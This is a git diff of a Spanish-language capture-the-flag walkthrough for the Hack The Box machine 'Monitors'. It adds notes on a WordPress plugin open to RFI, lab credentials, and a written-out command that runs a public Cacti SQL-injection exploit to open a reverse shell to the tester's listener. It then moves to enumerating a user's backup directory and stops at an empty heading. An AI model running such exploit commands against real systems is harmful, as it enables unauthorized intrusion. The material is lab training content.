@@ -4,7 +4,7 @@
 
 ## Datos de Interés
 
-Esta máquina la catalogaría de excelente. Son conceptos básicos lo que explotaremos, pero requieres tener buen ojo donde buscar. Empezaremos con una enumeración basica que tras investigar su puerto 80, nos dará como resultado un dominio existente. En este dominio encontraremos alojado un WordPress. 
+Esta máquina la catalogaría de excelente. Son conceptos básicos lo que explotaremos, pero requieres tener buen ojo donde buscar. Empezaremos con una enumeración basica que tras investigar su puerto 80, nos dará como resultado un dominio existente. En este dominio encontraremos alojado un WordPress con un plugin vulnerable a RFI. Pasaremos a obtener unas credenciales validas de un subdominio nuevo. De donde sacaremos una shell como el usuario www-data debido a un SQLi y una ejecución de comandos de la misma.
 
 
 ## Enumeración
@@ -108,7 +108,24 @@ Perfecto, las credenciales son válidas. Hora de ver como podemos vulnerarlo.
 
 Siquiera pongo el nombre, y las primeras recomendaciones son exploits, esto pinta bien (*aunque no para admin de Cacti*).
 La vulnerabilidad consiste en un SQLi, aprovecharé que ya tengo un exploit listo para usar, e intentaré sacar lo que pueda de aqui.
+Revisando el exploit, podemos inyectar comandos en la petición y como resultado obtener una shell. El exploit es bastante sencillo de usar:
 
+`python3 49810.py -t http://cacti-admin.monitors.htb -u admin -p 'BestAdministrator@2020!' --lhost 10.10.16.7 --lport 8888`
+
+![image](https://user-images.githubusercontent.com/87484792/185175433-6536ee04-d7c3-462a-9342-0f6950424304.png)
+
+## www-data -> Marcus
+
+Una vez tenemos una shell como el usuario www-data, y haciendo un tratamiento de la TTY. Toca investigar como avanzar.
+
+![image](https://user-images.githubusercontent.com/87484792/185176203-55c64125-bb0d-47f0-a74d-ee5fe1d13f37.png)
+
+El usuario marcus tiene la flag de user, sin embargo no tenemos privilegios para leerla. Una cosa interesante es que tenemos un directorio **.backup**. Sin embargo los privilegios son algo extraños. Podemos atravesar el directorio, pero no podemos visualizar su contenido. Aqui se me ocurren dos caminos que podemos tomar. 
+Podemos buscar archivos con la ruta, para ver si alguno nos muestra el contenido, o podemos scriptear un ataque de fuerza bruta para intentar ejecutar a ciegas algún archivo, este camino tomará mucho tiempo y no es del todo seguro que podamos encontrarlo. Sin embargo explicaré el mecanismo.
+
+Antes de probar nada, intenté ejecutar algún *id_rsa* o archivos similares. No tuve suerte.
+
+# 
 
 
 
